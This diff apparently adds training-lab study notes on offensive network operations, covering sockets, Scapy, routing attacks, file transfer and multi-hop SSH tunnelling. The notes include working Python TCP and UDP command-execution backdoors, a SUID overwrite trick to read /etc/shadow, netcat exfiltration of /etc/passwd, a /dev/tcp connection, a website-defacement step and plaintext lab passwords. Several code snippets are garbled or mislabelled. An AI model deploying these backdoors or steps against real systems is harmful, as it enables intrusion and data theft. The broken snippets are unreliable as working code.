@@ -1,0 +1,2311 @@
+``` MISC NOTES 
+
+ SSH
+	-o UserKnownHostsFile=/dev/null // when authenticating, writes server ssh key to known /dev/null ; discard it
+	-o StrictHostKeyChecking=no // if received host key is new, automatically pushes key to known hosts file (/dev/null); doesn't ask
+	
+SSH config shell = '~ + C' // hit enter first. can add PFs e.g.
+	-L127.0.0.1:1234:192.168.1.1:22
+	-R0.0.0.0:445:119.168.11.23:445
+	
+-o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no
+
+	# debug ssh - why still requiring password?
+		!!!! always use -v 
+	ssh -v www@192.168.0.2.80 
+		noticed ssh looked for id_rsa, not id_www upon connection. so 
+		cp ~/.ssh/id_www ~/.ssh/id_rsa 
+	ALSO ensure:
+		on tgt: chmod 700 .ssh/ && chmod 0640 .ssh/authorized_keys # may need 0600
+		on local: chmod 0600 .ssh/id_rsa 
+		
+# cron - run every minute
+crontab -e 
+* * * * * /home/jcook/.bash_login 
+	or */1 * * * 
+	NOT - 1 * * * * // this runs first minute after every hour 
+
+*** REUP: firewall rules, interface config
+
+# drive sharing for rdp conn / mstsc  : must enable via GUI (local resources -> more -> drives)
+	- to copy/paste across RDP 
+	
+``` 
+
+{ ```1. Network Enumeration and Hardening ``` 
+
+{ ``` 1.1 Socket Programming ```
+
+# TCP { - the caring 
+
+{ # python server - receive 
+
+from socket import * 
+server=socket(ACINET, SOCK STREAM) 
+server.bind(("192.168.11.11", 12345)) 
+server.listen(10)
+client,address=server.accept() 
+client data=client.recv(100) 
+print(client_data) 
+client.send=("Hello World from server") 
+server. close()
+
+
+}
+
+{ # python client - send 
+
+from socket import * 
+server=socket(ACINET, SOCK STREAM) 
+server.bind(("192.168.11.11", 12345)) 
+server.listen(10) client,address=server.accept() 
+client data=client.recv(100) 
+print(client_data) 
+client.send=("Hello World from server") 
+server. close()
+
+
+}
+
+{ # python client - receive loop 
+#!/bin/python 
+from socket import * 
+fd = open("data.txt", "w") 
+client = socket(AFINET, SOCK_STREAM) 
+client.connect(("192.168.11.13", 80)) 
+chunk = client.recv(10) 
+while (chunk): 
+	fd.write(chunk)
+	chunk = client.recv(10) 
+client.close() 
+fd.close() 
+
+}
+
+{ # python server backdoor - subprocess/Popen library
+
+#! //bin/python 
+from socket import * 
+import subprocess 
+server = socket(AF_INET, SOCK_STREAM) 
+server.bind(("0.0.0.0", 21)) 
+server.listen(100) 
+client, address = server.accept() 
+command = client.recv(1024) 
+while command.rstrip('\n') != "quit": 
+	shellproc = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+	output=shellproc.stdout.read() 
+	client.send(output) 
+	errmsg=shellproc.stderr.read() 
+	client.send(errmsg) 
+	shellproc.kill() 
+	command = client.recv(1024) 
+client.close() 
+server.close() 
+
+}
+}
+
+# UDP { - the careless
+
+{ # python udp server - receive 
+from socket import *
+server=socket(AF_INET, SOCK_DGRAM)
+server.bind(("192.168.11.11", 12345))
+client_data,address=client.recvfrom(100) # returns a pair composed of data sent by client and source address/port pair 
+print(client_data)
+server.close()
+
+}
+
+{ # python udp client - send
+from socket import *
+client=socket (AF_INET,SOCK_STREAM)
+client.sendto("Hellow world from client", ("192.168.11.11", 12345)) # not nec. to setup an initial connection to send data
+client.close()
+ 
+}
+
+{ # python udp backdoor
+
+#!/bin/python 
+from socket import * 
+import subprocess 
+server = socket(ACINET, SOCK_DGRAM) 
+server.bind(("0.0.0.0", 21)) 
+command, address = server.recvfrom(1024) 
+while command.rstrip('\n') != "quit": 
+	shellproc = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE 
+	output=shellproc.stdout.read() 
+	server.sendto(output, (address[0], 53)) 
+	errmsq=shellproc.stderr.read() 
+	server.sendto(errmsg, (address[0], 53)) 
+	shellproc.kill() 
+	command,address = server. recvfrom(1024) 
+server.close() 
+
+}
+
+{ # python udp recv backdoor (client)
+
+#! /usr/bin/python
+from socket import *
+client = socket(AF_INET,SOCK_DGRAM)
+client.bind(("0.0.0.0",53))
+while True:
+  r = client.recv(5120)  # bigbuff
+  print r
+
+client.close()
+
+}
+
+
+}
+
+# RAW { - the POWERFUL
+
+{ # serverside 
+from socket import *
+IPPROTO_CUSTOM=102 
+server=socket (AF_INET, SOCK_RAW, IPPROTO_CUSTOM) # RFC 1700 - numbers 101-254 not assignedto any transport proto
+server.bind((192.168.11.13", 0)) # port number means nothing (since not udp or tcp)
+client_data,address=server.recvfrom(100)
+print(client_data)
+server.close()
+
+}
+
+{ # clientside 
+from socket import *
+IPPROTO_CUSTOM=102
+server=socket (AF_INET, SOCK_RAW, IPPROTO_CUSTOM) 
+client.sendto("Hello worldfrom client", ("192.168.11.13", 0))
+client.close() 
+
+}
+
+{ # RIDP example ( re-implemented data protocol) 
+from socket import * 
+from types import * 
+import struct 
+IPPROTO RIDP = 17 
+# class RIDP (Re-Implemented Data Protocol) 
+class RIDP: 
+	def init (self, sport = 0, dport = 0, payload = ""): 
+		self.sport = sport 
+		self.dport = dport 
+		self.length = 0 
+		self.checksum = 0 
+		self.payload = payload 
+		def show(self): 
+			return str(self).encode("hex") 
+		def str (self): 
+		if type(self.payload) != StringType: 
+			self.payload = str(self.payload) 
+		self.length = 8 + len(self.payload) 
+		return struct.pack("!HHHH", self.sport, self.dport, self.length, self.checksum) + self.payload 
+		
+pkt = RIDP(10000, 8080, "Hello from client") 
+client=socket(ACINET, SOCK_RAW, IPPROTO_RIDP) 
+client.sendto(str(pkt), ("192.168.11.13", 0)) 
+client.close() 
+
+}
+
+}
+
+# SCAPY {
+
+{ # Basic shell commands 
+ls() # all available protocols in scapy
+lsc() # all funcs 
+pkt = IP() # create IP packet
+pkt.show() # show packet fields (with default values)
+pkt.dst="192.168.11.13" # manually assign. if dst ip is NON-LOCAL, scapy auto assigns one of machine's public IP
+	pkt=IP(dst="192.168.11.13")) # manually entered on packet creation 
+pkt=pkt/TCP() # concat next part of packet - resulting packet contains the payload, original packet is unchanged 
+pkt-pkt/Raw("raw data) # ^
+pkt["TCP"].dport=8080
+pkt["TCP"].sport=12345 
+pkt["Raw"].load = "Helloword" # since each packet = hash table / dictionary of sections - can access each part of packet by specifying payload's constructor e.g. TCP/ Raw 
+str(pkt) # display hexdump 
+send(pkt) # send it. transmission always happens at layer 3
+	sendp(pkt) # send layer 2 
+srloop(pkt, count=15) # send / receive loop - if expecting response 
+pkts = sniff(count=100, timeout=10) # sniff on wire 
+pkts.show() # view tcpdump like output 
+	pkts[0].show() # access packets independantly (since result is an array)
+	print pkts[1] ["IP"].dst
+ 
+}
+
+{ # Packet manipulation 
+
+#1. create an IPv4 packet named "ippkt" without any payload and with a destination address of 192.168.11.11
+ippkt = IP(dst="192.168.11.11")
+	ippkt = IP(); ippkt.dst = "192.168.11.11"
+	
+#2. create an ICMP PDU (Protocol Data Unit) named "pdu" that has the string "Hello World" as its payload
+create an ICMP PDU (Protocol Data Unit) named "pdu" that has the string "Hello World" as its payload
+pdu = ICMP()/Raw("Hello World")
+
+#3. build an entire IPv4 packet named "pkt" that is composed of the ippkt packet and the pdu payload
+pkt = ippkt/pdu
+
+#4. send it 10 times 
+send(pkt, count=10)
+	srloop(pkt, count=10) 
+}
+
+{ # traceroute script 
+from scapy.all import *
+
+pkt = IP(dst = "203.0.113.12")/ICMP()/Raw("Helloworld")
+for ttl in range(1,30):
+    pkt.ttl = ttl
+    resp  = sr1(pkt)
+    if resp != None:
+        print resp.src
+
+# to make UDP traceroute 
+- change ICMP() to UDP() and add a SRC/DST port
+}
+
+
+}
+
+# EXAM {
+
+{# improved python backdoor + file transfer 
+
+#! /usr/bin/python
+from socket import *
+import subprocess
+import os
+import thread
+import signal
+import sys
+
+def sig_handler(signum, frame):
+    if signum == signal.SIGINT:
+        server.close()
+        sys.exit(0)
+
+def client_handler(client, endpoint):
+    while True:
+        command = client.recv(1024).rstrip("\n")
+        op = ""
+        arg = ""
+        parts = command.split(" ", 2)
+        if len(parts) == 2:
+            op, arg = parts
+        else:
+            op = command
+        
+        if op == "get" and os.access(arg, os.R_OK) == True:
+            fhandle = open(arg, "r")
+            fdata = fhandle.read()
+            client.send(fdata)
+            fhandle.close()
+        elif op == "put" and arg != "":
+            address, port =  endpoint
+            s = socket(AF_INET, SOCK_STREAM)
+            if s.connect_ex((address, 80)) == 0:
+                fhandle = open(arg, "w")
+                fdata = s.recv(1000)
+                fhandle.write(fdata)
+                fhandle.close()
+				# This is not the same code that will be returned by the server.
+                
+				# On the version running on the server, this code is different.
+                client.send("9637d2c1-07f2-444f-a745-3635559fb50c")
+            s.close()
+        elif op == "exit":
+            client.close()
+            thread.exit()
+        else:
+            shellproc = subprocess.Popen(op, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            output=shellproc.stdout.read()
+            client.send(output)
+            errmsg=shellproc.stderr.read()
+            client.send(errmsg)
+            shellproc.kill()
+			
+server = socket(AF_INET, SOCK_STREAM)
+server.bind(("0.0.0.0", 80))
+server.listen(100)
+# Setting up signal handler for CTRL-C
+signal.signal(signal.SIGINT, sig_handler)
+
+while True:
+    client, endpoint = server.accept()
+    # Starting a new thread to handle each connected client with the client_handler function
+    thread.start_new_thread(client_handler, (client, endpoint))
+
+}
+
+{ # scapy packet 
+>>>pkt=IP(dst="192.168.111.115")
+>>>icmp=ICMP()
+
+$ tcpdump src 192.168.111.115
+
+>>>srloop(pkt/icmp, 1)
+
+
+}
+
+}
+
+
+
+}
+
+{ ``` 1.2 Routers, Firewalls, and the Internet ```
+
+{ # Notes 
+- Autonomous System (AS) group of networked devices under single tech. administration (company, org, etc)
+- ISPs own blocks of public IPs 
+- RIR (Regional Internet Registries) databases (per each geographical area e.g. ARIS, AFRINIC, APNIC, RIPENCC) 
+	record assigned IPs 
+- US ISPs are regulated by the FCC (federal communications commission), other countries have their variants
+
+- Via BGP, routers determine determine A. their (BGP) routing tables B. valid routes 
+	- BGP: announces routes to Ips (which IPs its responsible for) & listens to peers for their network paths/IPs 
+		^ ROUTE ANNOUNCEMENT/ ADVERTISEMENT - sharing IP addresses that can be reached in your AS with peers
+		- EGP/BGP routing considerations: IP hijacking, IP leasing, SLAs
+	Routers determines routes by which route matches an dst IP the longest (via CIDR bits)
+- AS PATH = chain of AS to get to destination 
+	- When determining AS path to dst domain/IP, determines shortest num of AS traversed & chooses that path 
+
+# IP hijacking (bgp hijack/route hijack)
+- IP hijacking (also known as BGP hijacking, prefix hijacking, or route hijacking) is the intentional and illegitimate route advertising and takeover of group(s) of IP addresses by corrupting Internet routing tables.
+
+# ASN Facts 
+- An ASN is a number that is used to define a group of routing prefixes that maintains a unique routing policy that differs from the routing policies of network border peers
+- Regional Internet Registries (RIR) assign unique ASNs for entities from an available assigned pool provided from the Internet Assigned Numbers Authority (IANA)
+	ARIN, AFRINIC, APNIC, lacnic, ripencc
+- RIRs CANNOT assign unique ASNs for entities across seven separate geographic areas of responsibility
+- Internet Service Providers (ISPs) use ASNs to control routing within their networks and to exchange routing information with other ISPs
+
+# How to research registrar / ASN info?
+ICANN lookup, whois 
+
+# Bogons / Martians?
+ogons are Martians (private and reserved addresses) and netblocks that have not been allocated to a RIR by the Internet Assigned Numbers Authority
+- 192.168.0.0/24, 172.16.0.0/16, 10.0.0.0/8, 169.254.0.0/16, 127.0.0.1, 255.255.255.255/32
+
+{ # ASN ATTACKS
+# IP Hijacking
+ the intentional illegitimate route advertising and takeover of groups of IP address by corrupting Internet routing tables
+ 
+# ASN Squatting 
+ASN squatting ignores the customary RIR registration channels and uses a dormant or unregistered ASN to announce an IP prefix intended to be used for malicious purposes.
+
+# ASN Hijacking 
+attacker seizes control of an RIR registration service account and thus gains control of all resources managed through this account
+
+# ASN Spoofing 
+attackers begin using an ASN that is already actively in use and authorized by a registered party without regard for that party
+
+# Methods to propagate advertisements of compromised ASN
+1. inserting route advertisements directly into the global routing system by establishing a BGP connection and peering with a security-poor AS; 
+2. use coercion or social engineering to convince the transit or access provider to connect to the compromised ASN as a BGP peer; 
+3. use collaboration and bribery to convince the transit or access provider to connect to the compromised ASN as a BGP peer.
+
+
+}
+
+
+}
+
+{ # Cisco Router Cmdline 
+
+# enter privileged exec mode 
+enable
+
+# hints for commands, syntax, features at higher priv levels
+?
+show ? 
+
+#abbreviations 
+sh # runs show 
+s? # display available s* commands
+
+# show version info 
+show version 
+	# interfaces, hardware type, siftware type, software version, feature set, system memory
+
+# enter configure mode (configure terminal) 
+conf t 
+
+# configure a particular interface. enable/disable protocols per interface 
+int s1/0
+
+# save running config to startup config/ NVRAM
+copy running-config startup-config 
+	write memory 
+	wr mem
+	
+# show running config
+show running-config
+
+}
+
+{ # Cisco ACL examples 
+FORMAT: [src IP/port] [dst IP/port]
+
+# what host can config router?
+TACACS host 
+
+# deny UDP packetes source 33434 and dst 33534 
+deny udp any any range 33434 33534 log
+
+# 192.168.10.1 can connect to ANY dest IP with bootps 
+permit udp host 192.168.10.1 any eq bootps
+
+
+# permit any traffic from 192.168.10.128 0.0.0.127
+permit ip any 192.168.10.128 0.0.0.127
+
+# permit any traffic from src 192.168.128.0 - 255 
+permit ip 192.168.128.0 0.0.0.255 any
+
+}
+
+}
+
+{ ``` 1.3 Transferring Files ```
+
+{ # Standard File Transfer 
+
+# Method notes { 
+``` ================= NIX ================= ```
+- scp & 'net use' assume current system user if no username is given (- almost never works)
+	- often give DOMAIN for the user (domain or local hostname)
+
+# ssh 
+scp 
+	scp [[user1@]host1:]src_file [[user2@]host1:]dst_file
+ssh (sockets) > method 
+
+# FTP 
+ftp 
+
+#web transfer 
+	curl 
+	wget 
+	Invoke-WebRequest 
+	
+#mail transfer 
+
+#network shares 
+	NFS / mount 
+	smb transfer (impacket)
+	
+#other services 
+	- mutt # unix mail 
+	- IRC (download IRC files)
+	- almost any network-enabled service can be used
+	
+``` ================= WIN ================= ``` 
+
+#ssh 
+WinSCP # GUI
+pscp # putty cli for windows 
+
+# ftp 
+ftp (active mode issues across networks where client is firewall/ NATd. may need passive)
+tftp - simple,udp version
+
+# RDP 
+
+	#web 
+		GUI (browser)
+	#cli 
+		mstsc /v:xp.ops.local 
+
+#mail transfer 
+
+#network shares 
+xcopy
+net use p: \\192.168.111.117\c$ /user:[DOMAIN\]username 
+
+# other services 
+rcp
+	requires rsh daemon running on nix?
+
+}
+
+{ # FTP / TFTP exercise
+
+
+}
+
+{ # Win Shares and HTTP exercise 
+# mount web share 
+net use x: \\www.ops.local\WEB /user:haxor
+
+# wget file 
+wget http://www.ops.local:80/default.htm -O /tmp/default.legit
+
+# pscp file 
+pscp remoteuser@ras.fatdeer.lab:/bin/cat .
+
+# cool privesc: suid tool -OVERWRITE- trick (applies to any tool that can overwrite, but wget example)
+1. have .wget with SUID bit # so can write anywhere... but new files are owned by root... 
+2. choose program you want root perms to (e.g. cat)
+2. overwite a global root SUID program e.g. /bin/ping,/bin/umount,etc. # writes program into a file that you can run with root perms
+	find /bin -perm /u+s # find one 
+	.wget http://server.local:80/nc.jpg -O /bin/umount 
+3. /bin/umount /etc/shadow
+
+
+
+}
+
+{ # RDP exercise 
+
+# RDP connect Win CLI
+mstsc /v:xp.ops.local 
+/v:<server [:port]>] [/admin] [/f [ullscreen]] [/w:] [/h:] [/public] | [/span] [/edit "connection file"] [/migrate] [/?]
+
+# for file transfer via clipboard - server back to client - must edit advanced 'local resources' settings via GUI 
+https://www.helpwire.app/blog/remote-desktop-transfer-files/
+
+mstsc.exe 
+	'Local Resources'
+	'More'
+	*Click on Drives, ensure drives & subcategories are checked
+	*connect
+}
+
+
+}
+
+{ # Non-standard File Transfer 
+
+# Method notes {
+"reverse nc transfer"
+- listen on host, remote system calls to local machine. more likely to pass a firewall
+
+BEST PRACTICES
+1. test technique before using live
+2. compare hashes of files on BOTH ends 
+	NIX
+		m5sum file.txt /sha1sum file.txt  
+	windows
+		certutil -hashfile file.txt MD5
+			certutil -hashfile file.txt # older versions, md5 only, no md5 argument
+		cygwin
+		
+clipboard paste techniques 
+- very effective with windows terminals: BUT NOT PREFERRABLE bc slow/error-prone. Unacceptable OPSEC risk. 
+1. convert binary file to ASCII (by encoding via base64)
+2. copy/paste onto target 
+3. decode base64 
+
+# CONSIDERATIONS:
+1. File size. Consider packing executables (executable compression) - packers: smaller size/ slightly less efficient runtime. Some antivirus flag packed executables as malware 
+2. x86 vs x64?
+3. static vs dynamic linked libarary tools? 
+	static > preferred (if size can be managed) 
+4. when transferring text/scripts from linux > win, BEWARE \n issue 
+	UNIX uses [LF] (ASCII code 10) for end of textline 
+	WIN uses [CR][LF] (ASCII code 13 and 10)
+	- windows notepad++ has an edit EOL conversion option 
+	- unix has dos2unix/ unix2dos
+
+}
+
+{ # Netcat transfer 
+Basic file transfer
+#1. listen on linux ops 
+nc -l 8888 < /etc/passwd 
+#2. windows (grab via tgt)
+nc linux.ops.local 8888 > passwd 
+
+Reverse NC transfer 
+#1. host listener on linux ops 
+nc -l 12345 > passwd 
+#2. send via tgt 
+nc 192.168.11.13 12345 < passwd 
+
+}
+
+{ # ncat 
+- offers ipv4+ipv6, SSL support, socks/http proxy, supports solaris/linux/windows
+
+}
+
+{ # socat 
+- unix only, ipv4+ipv6, ROBUST redirection 
+
+}
+
+{ # terminal cut and paste (linux clipboard transfers using windows)
+(on linux, just encode, paste, decode)
+
+1. encode file (e.g.) base64 
+2. on remote tgt terminal, capture text typed into shell into file w/shell redirection
+	unix
+		cat > target.64
+	windows
+		more > target.64
+3. cut and paste text into remote tgt terminal text window
+4. decode with base64 on remote end 
+
+# VIDEO STEPS - using windows, clipboard copy binary tool from target1 (linux.ops.local) to target2 (1337h4x.ops.local)
+1. putty into linux.ops.local, encode the tool ('/tmp/yes' for this example)
+	base64 /tmp/yes 
+2. right click linux.ops.local terminal, click 'copy all to clipboard'
+3. paste into windows notepad++, clean up file so its only encoded binary file 
+4. copy encoded binary to clipboard
+
+5. putty into 1337h4x.ops.local (target2)
+6. prep destination screen terminal window to accept file 
+	cat > /tmp/yes.64
+6.5 rightclick window to paste base64, CTRL-C to exit 
+7. decode 
+	cat /tmp/yes.64 | base64 -di > yes
+		
+# cut/paste into windows TELNET terminal issue workaround - requires "paste delay"
+need to use a client that allows us to set a "paste delay"
+1. Connect to RD via TeraTerm
+2. In TeraTerm, in the menu Setup > Additional Settings > Copy and Paste, set "Paste delay per line" value to 150ms
+
+}
+
+{ # base64 encode/decode tools - to support ^
+
+# openssl 
+openssl enc -base64 
+openssl enc -base64 -d 
+	openssl enc -base64 -d < /tmp/file.txt > /tmp/Interesting-Binary
+
+# python
+python -m base64 [file.64]
+python -m base64 -d [file.64]
+
+# certutil 
+certutil -encode [infile] [outfile]
+certutil -decode [infile] [outfile]
+
+# powershell
+// To Base64 Encode a File via Powershell 
+$ec=get-content -Encoding Byte "YOUR INPUT FILENAME HERE" 
+$eE=[System.Convert]::ToBase64String($eC,[System.Base64FormattingOptions]::InsertLineBreaks) 
+$eE | set-content -Encoding ASCII "YOUR OUTPUT FILENAME HERE" 
+
+// To Base64 Decode a File via Powershell 
+$fs=(get-content "YOUR INPUT FILENAME HERE") -join "" 
+$fD=[System.Convert]::FromBase64string($fs) 
+$fD | set-content -Encoding Byte "YOUR OUTPUT FILENAME HERE" 
+
+// To uudecode a File via Perl 
+perl -e '$in=""; open OUT,">YOUR OUTPUT FILENAME HERE..; binmode OUT; while (<>){next if /^begin/; last if /^end/; $in .= $_;} print "Bytes in:".length($in)."\n"; $out=unpack "u",$in; print "Bytes out:".length($out)."\n"; print OUT $out;'
+
+# differences between certutil encode and base64/other methods 
+- certutil includes a "---BEGIN CERTIFICATE--- /  ---END CERTIFICATE---
+- different line lengths, windows 64-character; linux 76-char per line 
+
+
+}
+
+}
+
+{ # EXAM
+
+#pscp transfer
+pscp -P 2222 C:\hasher.sh mohunt@100.64.36.17:/tmp/hasher.sh 
+
+
+python -m base64 -d rcpdump.exe
+
+}
+
+}
+
+{ ``` 1.4 Forward SSH Tunneling ```
+
+{ # basic syntax / advanced notes / encapsulation/channel/forwarding theory
+ssh user@198.18.30.5 -L<listener config>:<forwarder config>
+
+ssh user@198.18.30.5 -L127.0.0.1:8080:203.0.113.12:80
+ssh user@198.18.30.5 -L8080:203.0.113.12:80
+
+# note 
+- can modify listening interface; 127.0.0.1 if only localhost needs access to tunnel. can specify multiple interfaces or 0.0.0.0 if want others to use it
+	- DEFAULT: omit to just use 127.0.0.1
+
+- per created tunnel: always a forwarder and listener end(point)
+	for forward tunnels: ssh client = listener, ssh server= forwarder
+	- associates traffic with channel. deencap/encaps traffic through each hop.
+	
+# add notes:
+- tcp handshake occurs at both endpoints: client connecting to listener and ssh server/forwarder pushing to target 
+	- both dont know or care about the other 
+- data sent through tunnel is encapsulated and encrypted by SSH client, decrypted by server, then pushed to target 
+- ssh client creates an SSH PROTOCL MESSAGE, establishing there is data to forward and a CHANNEL between client/server
+e.g. say if ops box -> -LPF0.0.0.0:80:RD:8080
+	on ops box, http app data written to open socket, encapsulated as TCP PUSH and sent to listner (client), deencapsulated and removes transport/network header data. Then encrypts/encapsulates data and forwards through channel to ssh server (forwarder)
+	
+}
+
+{ # add. commands / reference 
+
+#1. window CLI RDP 
+mstsc /v:linux.ops.local:2226
+
+#2. escape sequence (in any SSH terminal) - add new tunnel to existing session 
+~C # open command line. can use -L or -R. Or cancel existing RPF: -KR hostport. Can only enter ONE command per.
+	hit in succession ~ + C # is finicky. has to be after an ENTER (carriage return)
+# set up LPF through current terminal (only option is 127.0.0.1 interface)
+-L2223:192.168.1.4:22
+
+#3. Remove an offending SSH key line - sed 
+sed -i '6d' ~/.ssh/known_hosts # removes 6th key line. replace 6 with the 'offending key [num]' 
+
+#4. conn to net share 
+net use p: \\192.168.11.15\C$ /u:administrator CrackM32
+net use /delete z:
+
+}
+
+{ # Single Hop to Internal Website Exercise 1 - (ssh tunnel with putty / local winbox as listener)
+Ops Box: pw.ops.local
+> Jump 1: linux.ramrod.lab (EXT IP: 100.64.36.17), access via SSH port 2222, Creds: root / P@$$w0Rd123
+>> Target 1: www.ramrod.lab (IP: 192.168.1.11), access via HTTP port 80
+
+# ssh putty config 
+1. in the left-most configuration screen, open the Connection > SSH selector, and pick Tunnels. This is where you configure the listener and forwarder information. 
+2. The listener information is entered in two places: the interface is selected with the checkbox "Local ports accept connections from other hosts", and the port is entered in the "Source port" field. 
+	2.5 If the "Local ports" checkbox is checked, the tunnel will listen on all interfaces; otherwise it listens only on localhost.
+
+# note 
+- this putty method uses local windows opsbox as listener so after tuns setup ---
+http://127.0.0.1:8080 
+
+}
+
+{ # Single Hop to Internal Website Exercise 2 - (ssh tunnel linux / intermediary (J1) listener)
+don't need to specify interface # ssh -p2222 root@100.64.36.17 -L192.168.11.13:8080:192.168.1.11:80
+P@$$w0Rd123
+
+http://192.168.11.13:8080
+
+
+}
+
+{ # Single Hop to Inaccessible Host
+ssh -p22 remoteuser@ras.fatdeer.lab -L1234:172.18.47.17:22
+remote
+
+ssh -p1234 radius@localhost
+AndUlna
+
+scp -P1234 radius@127.0.0.1:/etc/raddb/radiusd.conf /tmp/radiusd.conf
+
+}
+
+{ # Multi-Hop Tunnels to Isolated Network 1
+linux.ops.local     ras.fatdeer.lab     ccc.raccoon.lab     dhcp.raccoon.lab    	WIN7
+ 192.168.11.13        198.18.30.5         203.0.113.5          172.16.0.2 		  192.168.1.4
+---------------     ---------------     ---------------     ---------------     ---------------
+|             ------>22           |     |             |     |             |     |             |
+|         2221>===================------>22           |     |             |     |             |
+|         2222>=======================================------>22          |      |             |
+|         2224>=======================================---------------------------->23
+|             |     |             |     |             |     |             |     |             |
+|             |     |             |     |             |     |             |     |             |
+---------------     ---------------     ---------------     ---------------     ---------------
+
+Create first tunnel:
+ssh remoteuser@ras.fatdeer.lab -L2221:203.0.113.5:22
+remote
+
+Create second tunnel:
+ssh -p 2221 jcook@127.0.0.1 -L2222:172.16.0.2:22
+Br0k3nRecord
+
+Conn to dhcp
+ssh -p2222 jcook@127.0.0.1
+Br0k3nRecord
+
+
+#3. Remove offending SSH key line - sed 
+sed -i '6d' ~/.ssh/known_hosts
+	# pay attentionto 'Offending key in /root/.ssh/known_hosts:[num]' // replace 6 with the num listed  
+
+#6.  sniff for ethernet broadcast traffic on the 192.168.1.0/24 network
+sudo snoop -I e1000g1 && net 192.168.1.0/24 && arp
+
+#9. escape sequence - add new tunnel to existing session 
+~C # open command line. can use -L or -R. Or cancel existing RPF: -KR hostport. Can only enter ONE command per.
+	hit quickly in succession ~ + C # is finicky... has to be after an ENTER (carriage return)
+-L2223:192.168.1.4:22
+
+#12. nmap through SSH tunnel - nmap -p2223 127.0.0.1 -sS -P0
+returns: 2223/tcp open unkown # <---witout add service info, useless. port will always be open since we created the tunnel
+nmap through LPF tunnels == useless without service identification
+
+#15. 
+-L2224:192.168.1.4:23
+
+#19. extra credit
+on dhcp 
+	~C
+	-L2225:192.168.1.4:3389
+
+on linux.ops.local
+	ssh -L0.0.0.0:2226:127.0.0.1:2225 root@127.0.0.1
+	sed -i '2d' ~/.ssh/known_hosts
+
+on pw.ops.local:
+	mstsc /v:linux.ops.local:2226
+}
+
+{ # Multi-Hop Tunnels to Isolated Network 2
+
+#J1 
+ssh -p2222 mohunt@100.64.36.17 -L2221:198.18.30.5:22
+nancy123?
+
+#RD1 
+ssh -p2221 remoteuser@127.0.0.1 -L2222:172.18.47.25:22 
+remote
+
+#T1
+ssh -p2222 mac@127.0.0.1 -L2223:172.18.47.101:22
+Th3Kn!f3
+
+#T2 
+ssh -p2223 mac@127.0.0.1 -L2224:192.168.17.99:22
+Th3Kn!f3
+
+#T3 
+ssh -p2224 ics@127.0.0.1 
+EyeCeeE$$
+
+
+
+# looking for another network and way in?
+- consider: netstat -rn === route added to another network 
+	- gateway for route = could be way in 
+	
+# banner grab without nc/nmap?
+	- use telnet!
+	
+#8
+-L2223:172.18.47.101:22
+ssh -p2223 mac@127.0.0.1 
+Th3Kn!f3
+
+}
+
+{ # Example LPF netstat output 
+1.	Listener on 127.0.0.1:2221. Created by ssh remoteuser@ras.fatdeer.lab -L2221:203.0.113.5:22.
+2.	Listener on 127.0.0.1:2222. Created by ssh -p 2221 jcook@127.0.0.1 -L2222:172.16.0.2:22.
+3.	Local: 192.168.11.13:34459 Foreign: 198.18.30.5:22. Created by ssh remoteuser@ras.fatdeer.lab -L2221:203.0.113.5:22.
+4.	Local: 127.0.0.1:52094 Foreign: 127.0.0.1:2221. Created by ssh -p 2221 jcook@127.0.0.1 -L2222:172.16.0.2:22.
+5.	Local: 127.0.0.1:2221 Foreign: 127.0.0.1:52094. Created by ssh -p 2221 jcook@127.0.0.1 -L2222:172.16.0.2:22.
+6.	Local: 127.0.0.1:42451 Foreign: 127.0.0.1:2222. Created by ssh -p 2222 jcook@127.0.0.1.
+7.	Local: 127.0.0.1:2222 Foreign: 127.0.0.1:42451. Created by ssh -p 2222 jcook@127.0.0.1.
+	# easy to remember: listening ports vs epheremeral high ports. SSH tunns using 127.0.0.1 can be confusing, but just think your local listening port from a random high port down tunnel (yet represented as 127.0.0.1)
+	
+	# also remember, establishing the LPF will create ONE local listener conn on your endpoint 
+		- BUT establishing an ssh conn through an LPF will create TWO established conns, all 127.0.0.1. see above/below 
+																							- ephemeral <-> local 
+																							- local <-> ephemeral
+
+Listener on 127.0.0.1:9122. Created by ssh -p 2222 mohunt@100.64.36.17 -L9122:198.18.30.5:22.
+Listener on 127.0.0.1:9222. Created by ssh -p 9122 remoteuser@127.0.0.1 -L9222:172.18.47.25:22.
+Local: 192.168.11.13:45394 Foreign: 100.64.36.17:2222. Created by ssh -p 2222 mohunt@100.64.36.17 -L9122:198.18.30.5:22.
+Local: 127.0.0.1:46015 Foreign: 127.0.0.1:9122. Created by ssh -p 9122 remoteuser@127.0.0.1 -L9222:172.18.47.25:22.
+Local: 127.0.0.1:9122 Foreign: 127.0.0.1:46015. Created by ssh -p 9122 remoteuser@127.0.0.1 -L9222:172.18.47.25:22.
+Local: 127.0.0.1:44859 Foreign: 127.0.0.1:9222. Created by ssh -p 9222 ics@127.0.0.1.
+Local: 127.0.0.1:9222 Foreign: 127.0.0.1:44859. Created by ssh -p 9222 ics@127.0.0.1.
+
+
+}
+
+{ # Multi-Hop Tuns to Firewalld Host 
+
+# 8. Tunnels for 
+L33th4x LPF 2221:22 > RD1 -> LPF T1 port 0.0.0.0:4445:T1-IP:445 
+win7 will connect to L33tHax 4445 to access share
+
+ssh -p22 www@192.0.2.80 -L2222:198.18.30.5:22 
+Webific@ti0n
+
+# LPF from RD1 (behind firewall), open 4445 for win7 and 2222 to telnet
+ssh -p2221 remoteuser@127.0.0.1 -L0.0.0.0:445:198.18.30.12:445 -L2222:198.18.30.12:23
+remote 
+
+#15. From win7.ops.local machine, mount the C drive on www.fatdeer.lab as P drive
+net use p: \\192.168.11.15\C$ /u:administrator CrackM32
+
+#16. copy defacement
+copy c:\temp\deface.png p:\Fatdeer-Web\images\FatDeer.png
+	# remember to clear firefox cache
+	
+	
+# bonus - bash shell connect 
+exec 3<> /dev/tcp/203.0.113.5/80
+
+
+}
+
+{ # Troubleshooting Tuns - putty / plink tunneling 
+
+# putty 
+putth -ssh root@linux.ops.local -L 1992:ftp.ops.local:22
+
+#plink
+plink root@linux.ops.local -L 1992:ftp.ops.local:22
+
+}
+
+{ # EXAM 
+
+{ # CS2 
+ssh -p22 remoteuser@198.18.30.5 -L2221:192.0.2.80:22
+remote
+
+ssh -p2221 www@127.0.0.1 -L0.0.0.0:3389:192.168.217.201:3389 -L0.0.0.0:445:192.168.217.201:445
+Webific@ti0n
+
+
